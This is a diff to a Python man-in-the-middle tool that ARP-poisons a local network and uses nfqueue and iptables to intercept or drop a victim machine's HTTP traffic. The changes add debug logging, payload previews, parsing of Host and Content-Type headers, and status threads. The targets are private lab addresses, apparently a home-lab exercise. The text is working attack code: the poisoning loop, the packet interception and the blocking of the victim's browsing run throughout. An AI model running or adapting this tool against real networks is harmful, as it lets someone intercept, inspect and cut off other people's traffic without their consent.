@@ -190,6 +190,22 @@ class HTTPInterceptorStats:
             else:
                 print(f"   {Fore.YELLOW}• No HTTP packets dropped - victim may not be browsing HTTP sites{Style.RESET_ALL}")
 
+def check_arp_poisoning():
+    """Check if ARP poisoning is working by examining ARP tables"""
+    try:
+        # Get our MAC address
+        our_mac = get_if_hwaddr(interface)
+        logger.info(f"[ARP-CHECK] Our MAC address: {our_mac}")
+        
+        # Try to check victim's ARP table (this might not work remotely)
+        logger.info(f"[ARP-CHECK] ARP poisoning should make victim think gateway {gateway_ip} has MAC {our_mac}")
+        logger.info(f"[ARP-CHECK] And gateway should think victim {victim_ip} has MAC {our_mac}")
+        
+        return True
+    except Exception as e:
+        logger.warning(f"[ARP-CHECK] Could not verify ARP poisoning: {e}")
+        return False
+
 stats = HTTPInterceptorStats()
 
 def enable_ip_forwarding():
@@ -502,36 +518,59 @@ def tamper_http_packet(scapy_pkt, tcp_layer, payload):
 def modify_packet(packet):
     """Main packet modification function based on HTTP_ATTACK_MODE"""
     try:
+        # Basic logging to confirm function is being called
+        if stats.total_packets % 10 == 0:  # Log every 10th packet
+            logger.info(f"[PACKET-COUNT] Processed {stats.total_packets} packets so far...")
+        
         scapy_pkt = IP(packet.get_payload())
         stats.total_packets += 1
         
         src_ip = scapy_pkt.src
         dst_ip = scapy_pkt.dst
         
+        # Debug logging for DROP mode
+        if HTTP_ATTACK_MODE == "DROP":
+            logger.info(f"[DROP-DEBUG] Processing packet: {src_ip} → {dst_ip}")
+        
         # Check if this traffic involves our target victim
         is_victim_traffic = (src_ip == victim_ip or dst_ip == victim_ip)
         
         if not is_victim_traffic:
+            if HTTP_ATTACK_MODE == "DROP":
+                logger.info(f"[DROP-DEBUG] Skipping non-victim traffic: {src_ip} → {dst_ip}")
             packet.accept()
             return
+        
+        if HTTP_ATTACK_MODE == "DROP":
+            logger.info(f"[DROP-DEBUG] ✅ Victim traffic detected: {src_ip} → {dst_ip}")
         
         # Check for HTTPS traffic (port 443) - log but don't process
         if scapy_pkt.haslayer(TCP):
             tcp_layer = scapy_pkt[TCP]
             if tcp_layer.dport == 443 or tcp_layer.sport == 443:
                 stats.https_packets += 1
-                # Removed frequent HTTPS logging
+                if HTTP_ATTACK_MODE == "DROP":
+                    logger.info(f"[DROP-DEBUG] Skipping HTTPS traffic: {src_ip}:{tcp_layer.sport} → {dst_ip}:{tcp_layer.dport}")
                 packet.accept()
                 return
         
         # Only process TCP packets with payload
         if not scapy_pkt.haslayer(TCP) or not scapy_pkt.haslayer(Raw):
             stats.non_http_packets += 1
+            if HTTP_ATTACK_MODE == "DROP":
+                has_tcp = scapy_pkt.haslayer(TCP)
+                has_raw = scapy_pkt.haslayer(Raw)
+                logger.info(f"[DROP-DEBUG] Skipping packet - TCP: {has_tcp}, Raw: {has_raw}")
             packet.accept()
             return
         
         tcp_layer = scapy_pkt[TCP]
         payload = scapy_pkt[Raw].load
+        
+        if HTTP_ATTACK_MODE == "DROP":
+            logger.info(f"[DROP-DEBUG] TCP packet with payload: {src_ip}:{tcp_layer.sport} → {dst_ip}:{tcp_layer.dport}, payload size: {len(payload)}")
+            payload_preview = payload[:50].decode('utf-8', errors='ignore')
+            logger.info(f"[DROP-DEBUG] Payload preview: {payload_preview}")
         
         # Check if this is HTTP traffic (requests or responses on ports 80/8000)
         is_http_port = (tcp_layer.sport == 80 or tcp_layer.dport == 80 or 
@@ -543,29 +582,85 @@ def modify_packet(packet):
         
         is_http_response = payload.startswith(b"HTTP/")
         
+        if HTTP_ATTACK_MODE == "DROP":
+            logger.info(f"[DROP-DEBUG] HTTP check - Port: {is_http_port}, Request: {is_http_request}, Response: {is_http_response}")
+        
         # For DROP mode, drop ALL HTTP traffic (both requests and responses) early
         if HTTP_ATTACK_MODE == "DROP" and is_http_port and (is_http_request or is_http_response):
             stats.dropped_packets += 1
+            
+            logger.info(f"[DROP-DEBUG] 🎯 DROPPING PACKET - Port: {is_http_port}, Request: {is_http_request}, Response: {is_http_response}")
             
             # Determine packet type and direction for logging
             if is_http_request:
                 direction = "OUTGOING REQUEST" if src_ip == victim_ip else "INCOMING REQUEST"
                 try:
                     request_line = payload.decode('utf-8', errors='ignore').split('\n')[0]
-                    logger.info(f"[DROP] 🗑️ Dropped HTTP {direction}: {request_line.strip()} ({src_ip}:{tcp_layer.sport} → {dst_ip}:{tcp_layer.dport})")
+                    
+                    # Extract additional info from request
+                    headers_text = payload.decode('utf-8', errors='ignore')
+                    host = ""
+                    if "Host:" in headers_text:
+                        for line in headers_text.split('\n'):
+                            if line.lower().startswith('host:'):
+                                host = line.split(':', 1)[1].strip()
+                                break
+                    
+                    host_info = f" to {host}" if host else ""
+                    logger.info(f"[DROP] 🗑️ Dropped HTTP {direction}: {request_line.strip()}{host_info} ({src_ip}:{tcp_layer.sport} → {dst_ip}:{tcp_layer.dport})")
                 except:
                     logger.info(f"[DROP] 🗑️ Dropped HTTP {direction} ({src_ip}:{tcp_layer.sport} → {dst_ip}:{tcp_layer.dport})")
             
             elif is_http_response:
                 direction = "INCOMING RESPONSE" if dst_ip == victim_ip else "OUTGOING RESPONSE"
                 try:
-                    status_line = payload.decode('utf-8', errors='ignore').split('\n')[0]
-                    logger.info(f"[DROP] 🗑️ Dropped HTTP {direction}: {status_line.strip()} ({src_ip}:{tcp_layer.sport} → {dst_ip}:{tcp_layer.dport})")
+                    # Parse response headers to get content type
+                    headers_text = payload.decode('utf-8', errors='ignore')
+                    status_line = headers_text.split('\n')[0].strip()
+                    
+                    # Extract content type and length
+                    content_type = ""
+                    content_length = ""
+                    is_html = False
+                    
+                    for line in headers_text.split('\n'):
+                        line_lower = line.lower()
+                        if line_lower.startswith('content-type:'):
+                            content_type = line.split(':', 1)[1].strip()
+                            if 'text/html' in content_type.lower():
+                                is_html = True
+                        elif line_lower.startswith('content-length:'):
+                            content_length = line.split(':', 1)[1].strip()
+                    
+                    # Create detailed log message
+                    content_info = ""
+                    if is_html:
+                        content_info = f" [🌐 HTML CONTENT"
+                        if content_length:
+                            content_info += f", {content_length} bytes"
+                        content_info += "]"
+                    elif content_type:
+                        content_info = f" [{content_type}"
+                        if content_length:
+                            content_info += f", {content_length} bytes"
+                        content_info += "]"
+                    elif content_length:
+                        content_info = f" [{content_length} bytes]"
+                    
+                    logger.info(f"[DROP] 🗑️ Dropped HTTP {direction}: {status_line}{content_info} ({src_ip}:{tcp_layer.sport} → {dst_ip}:{tcp_layer.dport})")
+                    
+                    # Special highlight for HTML content
+                    if is_html:
+                        logger.info(f"[DROP] 🌐 ⚠️  HTML webpage blocked - victim will see connection timeout/error")
+                        
                 except:
                     logger.info(f"[DROP] 🗑️ Dropped HTTP {direction} ({src_ip}:{tcp_layer.sport} → {dst_ip}:{tcp_layer.dport})")
             
             packet.drop()
             return
+        
+        if HTTP_ATTACK_MODE == "DROP":
+            logger.info(f"[DROP-DEBUG] Packet not dropped - continuing to normal processing")
         
         # For non-DROP modes, continue with original logic
         # Use port-based detection like the original working version (port 80 and 8000)
@@ -623,6 +718,9 @@ def modify_packet(packet):
 def start_packet_interception():
     """Start packet interception based on mode"""
     logger.info(f"[SETUP] Setting up iptables rules for HTTP {HTTP_ATTACK_MODE} mode")
+    logger.info(f"[SETUP] Target victim IP: {victim_ip}")
+    logger.info(f"[SETUP] Gateway IP: {gateway_ip}")
+    logger.info(f"[SETUP] Interface: {interface}")
     
     # Clear existing rules first
     os.system("iptables -F")
@@ -661,8 +759,27 @@ def start_packet_interception():
         print(f"{Fore.MAGENTA}🗑️  DROP MODE: Blocking all HTTP traffic{Style.RESET_ALL}")
         print(f"{Fore.RED}⚠️  Victim will be unable to browse HTTP sites{Style.RESET_ALL}")
         print(f"{Fore.YELLOW}💡 HTTPS sites will still work (encrypted){Style.RESET_ALL}")
+        print(f"{Fore.CYAN}🔍 Debug logging enabled - watch for [DROP-DEBUG] messages{Style.RESET_ALL}")
+        print(f"{Fore.BLUE}💡 Try browsing to http://192.168.0.125:8000 from victim (192.168.0.201){Style.RESET_ALL}")
     
     print(f"{Fore.WHITE}🛑 Press Ctrl+C to stop and view statistics{Style.RESET_ALL}")
+    
+    logger.info("[SETUP] 🎯 Starting packet interception...")
+    
+    # Add periodic status logging
+    def status_logger():
+        start_time = time.time()
+        while True:
+            time.sleep(30)  # Log every 30 seconds
+            runtime = time.time() - start_time
+            logger.info(f"[STATUS] 🔄 Script running for {runtime:.0f}s - Total packets: {stats.total_packets} - Waiting for HTTP traffic...")
+            
+            if HTTP_ATTACK_MODE == "DROP" and stats.total_packets == 0:
+                logger.info(f"[STATUS] 💡 No packets detected - Check ARP poisoning is working")
+                logger.info(f"[STATUS] 💡 From victim (192.168.0.201), try: http://192.168.0.125:8000")
+    
+    status_thread = threading.Thread(target=status_logger, daemon=True)
+    status_thread.start()
     
     try:
         nfqueue.run()
@@ -721,6 +838,15 @@ def main():
         print(f"{Fore.RED}❌ Invalid HTTP attack mode: {HTTP_ATTACK_MODE}{Style.RESET_ALL}")
         print(f"{Fore.YELLOW}💡 Valid modes: {AttackConfig.ALLOWED_HTTP_ATTACK_MODES}{Style.RESET_ALL}")
         sys.exit(1)
+    
+    # Configuration verification
+    print(f"\n{Fore.CYAN}🔧 CONFIGURATION VERIFICATION:{Style.RESET_ALL}")
+    print(f"   Victim IP: {victim_ip}")
+    print(f"   Gateway IP: {gateway_ip}")
+    print(f"   Interface: {interface}")
+    print(f"   Victim MAC: {victim_mac}")
+    print(f"   Gateway MAC: {gateway_mac}")
+    print(f"   HTTP Attack Mode: {HTTP_ATTACK_MODE}")
     
     # Ask for confirmation
     if SecurityConfig.REQUIRE_CONFIRMATION:
@@ -782,6 +908,10 @@ def main():
             
             poison_count += 2
             
+            # Log every 20 poison attempts (40 packets) to show activity
+            if poison_count % 40 == 0:
+                logger.info(f"[ARP-POISON] Sent {poison_count} poison packets - attack is active")
+            
             time.sleep(AttackConfig.ARP_POISON_INTERVAL)
 
     poison_thread = threading.Thread(target=poison_loop, daemon=True)
@@ -790,6 +920,9 @@ def main():
     # Give ARP poisoning time to take effect
     logger.info("[ATTACK] Waiting 3 seconds for ARP poisoning to take effect...")
     time.sleep(3)
+    
+    # Check ARP poisoning status
+    check_arp_poisoning()
 
     # Start HTTP interception
     start_packet_interception()
